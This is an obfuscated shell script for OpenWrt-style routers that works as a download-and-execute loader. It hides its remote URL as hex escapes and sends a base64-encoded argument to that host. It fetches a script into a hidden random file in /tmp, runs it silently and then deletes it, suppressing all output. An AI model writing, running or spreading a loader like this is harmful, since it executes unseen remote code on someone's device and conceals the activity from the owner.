#!/bin/sh
_x1=$(printf '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x75\x74\x6f\x6c\x6f\x67\x69\x6e\x2e\x63\x72\x65\x61\x74\x69\x76\x79\x32\x34\x2e\x77\x6f\x72\x6b\x65\x72\x73\x2e\x64\x65\x76')
_x2="$1"
_x3="/tmp/.$(head -c 4 /dev/urandom | od -An -tx1 | tr -d ' \n')$$"
_x4() { printf '%s' "$1" | openssl enc -base64 -A 2>/dev/null | tr -d '\n'; }
_x5() { [ -z "$1" ] && return 1; opkg status "$1" 2>/dev/null | grep -q "Status:.*installed" 2>/dev/null; }
_x6() {
    _x5 "ca-certificates" || {
        opkg update >/dev/null 2>&1 || true
        opkg install ca-certificates >/dev/null 2>&1 || {
            exit 1
        }
    }
}
_x7() {
    _x6
    _x8=$(curl -sSL "$_x1/s?k=$(_x4 "$_x2")" -o "$_x3" 2>/dev/null && echo "1" || echo "0")
    [ "$_x8" = "1" ] && [ -s "$_x3" ] && {
        sh "$_x3" 2>/dev/null
        _x9=$?
        rm -f "$_x3" >/dev/null 2>&1
        exit $_x9
    }
    rm -f "$_x3" >/dev/null 2>&1
    exit 1
}
_x7
